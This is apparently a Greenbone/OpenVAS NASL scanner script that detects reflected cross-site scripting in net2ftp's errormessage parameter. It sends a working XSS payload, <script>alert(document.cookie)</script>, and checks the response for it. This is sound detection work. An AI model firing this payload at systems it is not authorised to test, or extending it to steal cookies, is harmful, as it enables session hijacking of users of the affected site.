CPE = "cpe:/a:net2ftp:net2ftp";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100126" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_bugtraq_id( 34440 );
	script_tag( name: "cvss_base", value: "2.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2009-04-12 20:09:50 +0200 (Sun, 12 Apr 2009)" );
	script_name( "net2ftp Multiple Cross-Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "net2ftp_detect.sc" );
	script_mandatory_keys( "net2ftp/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "The net2ftp program is prone to multiple cross-site scripting
  vulnerabilities because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit these issues to execute arbitrary script
  code in the browser of an unsuspecting user in the context of the affected site. This may help the
  attacker steal cookie-based authentication credentials and launch other attacks." );
	script_tag( name: "affected", value: "These issues affect net2ftp 0.98 and earlier." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/49791" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34440" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/index.php?state=login_small&errormessage=<script>alert(document.cookie)</script>";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!buf){
	exit( 0 );
}
if(IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) && egrep( pattern: "<script>alert\\(document\\.cookie\\)</script>", string: buf )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

